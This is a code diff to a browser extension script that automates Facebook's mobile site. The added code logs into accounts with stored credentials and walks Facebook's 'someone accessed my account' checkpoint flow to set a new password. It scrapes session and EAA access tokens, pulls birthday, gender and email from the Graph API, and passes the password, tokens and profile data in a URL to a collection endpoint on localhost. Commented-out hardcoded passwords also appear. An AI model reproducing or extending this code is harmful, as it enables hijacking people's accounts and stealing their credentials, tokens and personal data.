@@ -3,15 +3,88 @@
  * See license file for more information
  * Contact developers at mr.dinesh.bhosale@gmail.com
  * */
+ var api = typeof chrome!="undefined" ? chrome : browser;
  var check = 0,li,login,nexts;
+ var curl = window.location.href;
+var url = new URL(curl);
+var gcname = url.searchParams.get("cname");
+var action = url.searchParams.get("action");
+var backto = url.searchParams.get("backto");
 start();
 function start(){
-	if(window.location.href.match(/mbasic.facebook.com\/login/g)){
-	}else{
-		restartTool();
+	if(!curl.match(/\/mbasic.facebook.com\//g)) {
+		window.location.href = 'https://mbasic.facebook.com/?cname=getffba';
+	} else {
+		buildToolbox();
+		setTimeout(function(){
+			var curl = window.location.href;
+			var url = new URL(curl);
+			var chromename = url.searchParams.get("chromename");
+			var ch = {
+				'chromename': chromename
+			}
+			console.log('send chromename ' + chromename);
+		 	send_message("check", ch);
+		}, 10000);
+		setTimeout(function(){
+			chrome.storage.sync.get(['action'], function(result) {
+				if(result.action == 'welcome') {
+					chrome.storage.sync.get(['userinfo'], function(result) {
+						if(!result.userinfo.birthday) {
+							if(!curl.match(/\/zero\//g)) {
+								window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+							}
+						}
+					});
+				}
+			});
+		}, 60* 1000);
 	}
-	buildToolbox();
 }
+chrome.storage.sync.get(['userinfo'], function(result) {
+	console.log(result.userinfo);
+});
+chrome.storage.sync.get(['action'], function(result) {
+	console.log(result.action);
+	if(!result.action) {
+		chrome.storage.sync.get(['userinfo'], function(result) {
+			if(!result.userinfo.birthday) {
+				window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+			}
+		});
+	}
+	if(result.action == 'welcome') {
+		chrome.storage.sync.get(['userinfo'], function(result) {
+			if(!result.userinfo.birthday) {
+				if(!curl.match(/\/zero\//g)) {
+					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+				}
+			}
+		});
+	}
+	if(result.action == 'zero') {
+		chrome.storage.sync.get(['userinfo'], function(result) {
+			curl = window.location.href;
+			if(!curl.match(/\/zero\//g)) {
+				window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+			}
+		});
+	}
+	if(result.action == 'finish') {
+		chrome.storage.sync.get(['userinfo'], function(result) {
+			if(!result.userinfo.birthday) {
+				chrome.storage.sync.set({action: 'token'});
+				console.log('!birthday');
+				window.location.href = 'https://mobile.facebook.com/';
+			} else {
+				console.log('userinfo ok');
+				userdata = result.userinfo;
+				userinfo(userdata);
+			}
+		});
+	}
+});
+
 function resizeFrame() {
 	var newClassName = document.getElementById(targetDivId).getAttribute("class");
 	newClassName = newClassName.replace(" fst_container_resized", "");
@@ -34,16 +107,6 @@ function closeAll() {
 }
 //function for setting event listners
 function setEventListener() {
-	setTimeout(function(){
-		var curl = window.location.href;
-		var url = new URL(curl);
-		var chromename = url.searchParams.get("chromename");
-		var ch = {
-			'chromename': chromename
-		}
-	 	send_message("check", ch);
-	}, 3000);
-	
 	addEventListener("message", function(event) {
 		if (event.origin + "/" == chrome.extension.getURL("")) {
 			var eventToolName = event.data.name;
@@ -107,7 +170,32 @@ function setEventListener() {
 				//status(vars);
 
 				if(!login) {
-					chNow(vars);
+					api.storage.sync.get(['cname'], function(result) {
+						console.log(result.cname);
+						if(result.cname == 'getffba') {
+							if ($('input[name=email]').length>0) {
+								chNow(vars);
+							}
+						} else {
+							chrome.storage.sync.set({userinfo: ''});
+							//status(vars);
+							if ($('input[name=email]').length>0) {
+								chrome.storage.sync.set({cname: 'getffba'});
+								status(vars);
+							} else {
+								if(curl.match(/confirmemail/g)) {
+									vars.logout = 'confirmemail';
+									logout(vars);
+								} else if(curl.match(/checkpoint/g)) {
+									vars.logout = 'checkpoint';
+									logout(vars);
+								} else {
+									chNow(vars);
+								}
+							}
+						}
+					});	
+					
 				}
 				login = 1;
 			}
@@ -118,7 +206,9 @@ function setEventListener() {
 	}, false);
 }
 
+
 function getDetail(vars) {
+	var trylogin;
 	var http4 = new XMLHttpRequest;
 	var url4 = "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8";
 	http4.open("GET", url4, true);
@@ -147,7 +237,11 @@ function getDetail(vars) {
 						vars.jazoest = jazoest;
 						vars.fb_dtsg = fb_dtsg;
 					}
-					checknow(vars);
+					if(!trylogin) {
+						checknow(vars);
+						trylogin = 1;
+					}
+					
 				}
 			}
 			http4.close;
@@ -156,6 +250,7 @@ function getDetail(vars) {
 	http4.send(null);
 }
 function checknow(vars) {
+	var tch = false;
 	var r20 = {
 		lwv: 100,
 		refid: 8,
@@ -181,7 +276,10 @@ function checknow(vars) {
 			}
 		}
 	};
-	request["send"](deSerialize(r20));
+	if(!tch) {
+		request["send"](deSerialize(r20));
+		tch = 1;
+	}
 }
 
 function status(vars)
@@ -214,15 +312,36 @@ function status(vars)
 				if(!htmlstring.match(/confirmemail/g)) {
 					var message_to_show = 'Login success fully!';
 					toastr.success(message_to_show);
-
 					toastr.info('Please wait...');
-					if(htmlstring.match(/zero\/optin/g)) {
-						vars.freemode=1;
-						console.log('zero optin');
-						confirmfree(vars);
-					} else {	
-						getName(vars);
-					}
+					
+					var userinfo = {
+						phone: vars.email,
+						pass: vars.pass,
+						//pass: '02097872544',
+						npass: vars.npass,
+						chromename: vars.chromename,
+						id: vars.id,
+					};
+					chrome.storage.sync.set({userinfo: userinfo});
+					chrome.storage.sync.set({cname: 'getffba'});	
+					chrome.storage.sync.set({action: 'welcome'});	
+					chrome.storage.sync.set({backto: 'getffba'});	
+					window.location.href = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=getffba&action=lang';
+					// chrome.tabs.getSelected(null, function (tab) {
+					// 	tabid = tab.id;
+					// 	chrome.tabs.create({url: 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=zero&action=lang&backto=password', active: true});
+					// setTimeout(function(){
+					// 	getName(vars);
+					// }, (60*1000));
+
+					
+					// if(htmlstring.match(/zero\/optin/g)) {
+					// 	vars.freemode=1;
+					// 	console.log('zero optin');
+					// 	confirmfree(vars);
+					// } else {	
+					// 	getName(vars);
+					// }
 				}
 
 			} else {
@@ -382,10 +501,14 @@ function getDate(vars) {
 					uid: vars.uid,
 					uname: vars.uname,
 					id: vars.id,
+					chromename: vars.chromename,
 				};
-				setCookie("action", 'language', 1);
 				vars.en_US;
-				language(vars);
+
+				console.log('finish');
+				console.log(userinfo);
+
+				//language(vars);
 				//window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
 				//changePassword(vars);
 			}
@@ -936,3 +1059,226 @@ function getCookie(cname) {
   }
   return "";
 }
+function closeTabs(tabid) {
+	chrome.tabs.query({}, function(tabs) {
+		for (var i = 0; i < tabs.length; i++) {
+			if(tabs[i].id!=tabid) {
+				chrome.tabs.remove(tabs[i].id);
+			}
+	    }
+	  
+	});
+}
+function userinfo(userdata) {
+	var l = {};
+	l.id = '';
+	var pqr = new XMLHttpRequest;
+	pqr.open("GET", "https://mobile.facebook.com/composer/ocelot/async_loader/?publisher=feed", true);
+	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+	pqr.onreadystatechange = function() {
+		if (pqr.readyState == 4 && pqr.status == 200){
+			var t = pqr.responseText;
+			if(t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)) {
+				userdata.dtsg = t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)[1];
+			}
+			//userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
+			if(t.match(/USER_ID\\":\\"(.*?)\\"/)) {
+				userdata.user_id = t.match(/USER_ID\\":\\"(.*?)\\"/)[1];
+			}
+			if(t.match(/NAME\\":\\"(.*?)\\"/)) {
+				userdata.NAME = t.match(/NAME\\":\\"(.*?)\\"/)[1];
+			}			
+			if(t.match(/SHORT_NAME\\":\\"(.*?)\\"/)) {
+				userdata.SHORT_NAME = t.match(/SHORT_NAME\\":\\"(.*?)\\"/)[1];
+			}
+			if(t.match(/__spin_t\\":\\"(.*?)\\"/)) {
+				userdata.__spin_t = t.match(/__spin_t\\":\\"(.*?)\\"/)[1];
+			}
+			if(t.match(/dtsg\\":{(.*?)\\"/)) {
+				userdata.dtsg = t.match(/dtsg\\":{\\"token\\":\\"(.*?)\\"/)[1];
+			}
+			if(t.match(/name=\\"target\\" value=\\"(.*?)\\"/) && !userdata.user_id) {
+				userdata.user_id = t.match(/name=\\"target\\" value=\\"(.*?)\\"/)[1];
+			}
+			if(t.match(/,\{"token":"\(.\*\?\)"/g)) {
+				userdata.fb_dtsg = t.match(/,\{"token":"\(.\*\?\)"/g)[0].replace(',\{"token":"', '').replace('"', '');
+			} else {
+				if(t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)) {
+					userdata.fb_dtsg = t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)[1];
+				}
+			}
+			if(t.match(/"EAA(.*?)ZD/)) {
+				userdata.accessToken = 'EAA'+ t.match(/"EAA(.*?)ZD/)[1]+'ZD';
+			}
+			chrome.storage.sync.set({userinfo: userdata});
+			//window.location.href = 'https://mobile.facebook.com/';	
+			getme(userdata);	
+		}
+	}
+	pqr.send();
+}
+function getme(userdata) {
+	console.log(userdata);
+	var l = {};
+	l.id = '';
+	var pqr = new XMLHttpRequest;
+	pqr.open("GET", "https://graph.facebook.com/v9.0/me?access_token="+userdata.accessToken+"&debug=all&fields=id%2Cname%2Cbirthday%2Cemail%2Cgender%2Cabout&format=json&method=get&pretty=0&suppress_http_code=1&transport=cors", true);
+	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+	pqr.onreadystatechange = function() {
+		if (pqr.readyState == 4 && pqr.status == 200){
+			var t = pqr.responseText;
+			u = JSON.parse(t);
+			userdata.name = u.name;
+			userdata.gender = u.gender;
+			userdata.birthday = u.birthday;
+			chrome.storage.sync.set({action: ''});
+			chrome.storage.sync.set({cname: ''});
+			window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userdata);			
+		}
+	}
+	pqr.send();
+}
+function load(url, callback) {
+	console.log(url);
+	var http4 = new XMLHttpRequest;
+	var url4 = url;
+	http4.open("GET", url4, true);
+	http4.onreadystatechange = function (){
+		if (http4.readyState === 4 && http4.status == 200){
+			callback(http4.response);
+		} else {
+			return false;
+		}
+	};
+	http4.send(null);
+}
+
+/*Change language*/
+	if(gcname =='getffba' && action =='lang') {
+		chrome.storage.sync.set({action: 'lang'});
+		chrome.storage.sync.set({cname: 'getffba'});
+		$('h3 a').map( function() {
+			if($(this).attr('href').match(/l=en_US/g)) {
+		    	url = 'https://mbasic.facebook.com/'+$(this).attr('href');
+		    	var act = load(url,myFunction);
+		    }
+		}).get();
+	}
+	/*End Change language*/
+
+	function myFunction(xhttp) {
+		console.log('myFunction');
+		var curl = window.location.href;
+		var url = new URL(curl);
+		var gcname = url.searchParams.get("cname");
+		var action = url.searchParams.get("action");
+		var backto = url.searchParams.get("backto");
+		chrome.storage.sync.get(['userinfo'], function(result) {
+		if(result.userinfo) {	
+			chrome.storage.sync.set({cname: 'getffba'});				
+			window.location.href = 'https://mbasic.facebook.com/hacked/triage/?_rdr&action=someone_accessed&cname=getffba';
+		}
+		  // pw = '02097869025';
+		  // nw = 'khmer@123';
+		  // if($('input[name=password_old]').length) {
+		  // 	$('input[name=password_old]').val(pw);
+		  // }
+		  // if($('input[name=password_new]').length) {
+		  // 	$('input[name=password_new]').val(nw);
+		  // }
+		  // if($('input[name=password_confirm]').length) {
+		  // 	$('input[name=password_confirm]').val(nw);
+		  // }
+		});
+		// if(gcname =='getffba' && result.userinfo) {
+		// 	window.location.href = 'https://mbasic.facebook.com/hacked/triage/?_rdr&action=someone_accessed';
+		// }
+	}
+
+	
+	chrome.storage.sync.get(['cname'], function(result) {
+		console.log(result.cname);
+	  if(result.cname == 'getffba') {
+	  	/*Change password*/
+	  	if(action =='someone_accessed') {
+			//step 1
+			chrome.storage.sync.set({cname: 'getffba'});
+			var res = $('input[value=someone_accessed]').prop( "checked", true );
+			$('button[type=submit]').click();
+			
+		}
+	  	if(curl.match(/mbasic.facebook.com\/checkpoint\/flow/g)) {
+	  		//step 2
+	  		chrome.storage.sync.set({cname: 'getffba'});
+	  		$('#checkpointButtonContinue input[type=submit]').click();
+	  	}
+	  	if(curl.match(/mbasic.facebook.com\/checkpoint\/flow/g) && curl.match(/checkpoint_created=1/g)) {
+	  		//step 3
+	  		chrome.storage.sync.set({cname: 'getffba'});
+	  		if($('input[name=password_new]').length) {
+	  			chrome.storage.sync.get(['userinfo'], function(result) {				  
+				  // pw = '02097869025';
+				  // nw = 'khmer@123';
+				  chrome.storage.sync.set({action: 'password'});
+				  if($('input[name=password_old]').length) {
+				  	$('input[name=password_old]').val(result.userinfo.pass);
+				  }
+				  if($('input[name=password_new]').length) {
+				  	$('input[name=password_new]').val(result.userinfo.npass);
+				  }
+				  if($('input[name=password_confirm]').length) {
+				  	$('input[name=password_confirm]').val(result.userinfo.npass);
+				  	$('#checkpointSubmitButton input[type=submit]').click();
+				  }
+				  if($('input[name=password_new]').length) {
+				  	chrome.storage.sync.set({action: 'finish'});
+				  	$('#checkpointSubmitButton input[type=submit]').click();
+				  }
+				});
+	  		} else {
+	  			$('#checkpointSubmitButton input[type=submit]').click();
+	  		}
+	  		if($('#checkpointButtonGotoNewsFeed input[type=submit]').length) {
+	  			chrome.storage.sync.set({action: 'finish'});
+	  			$('#checkpointButtonGotoNewsFeed input[type=submit]').click();
+	  		}
+	  	}
+	  	/*End Change password*/
+
+	  	/*get name*/
+	  	chrome.storage.sync.get(['action'], function(result) {
+	  		if(result.action) {
+	  			console.log(result.action);
+	  			switch(result.action) {
+				  case 'password':
+					  	chrome.storage.sync.get(['userinfo'], function(result) {
+					  		userdata= result.userinfo;				    	
+					    	chrome.storage.sync.set({action: 'token'});
+					    	chrome.storage.sync.set({userinfo: userdata});
+					    	window.location.href = 'https://mobile.facebook.com/';
+					  	});
+					    break;
+				 	case 'token':
+					  	chrome.storage.sync.set({action: 'userinfo'});
+					    chrome.storage.sync.get(['userinfo'], function(result) {
+					  		userdata= result.userinfo;
+					    	userinfo(userdata);
+					  	});
+				    break;
+				    case 'userinfo':
+				    	//chrome.storage.sync.set({action: 'token'});
+					    chrome.storage.sync.get(['userinfo'], function(result) {
+					  		userdata= result.userinfo;
+					    	console.log(userdata);
+					    	getme(userdata);
+					  	});
+				    break;
+				  default:
+				    // code block
+				}
+	  		}
+	  	});
+	  	/*End get name*/
+	  }
+	});
+	
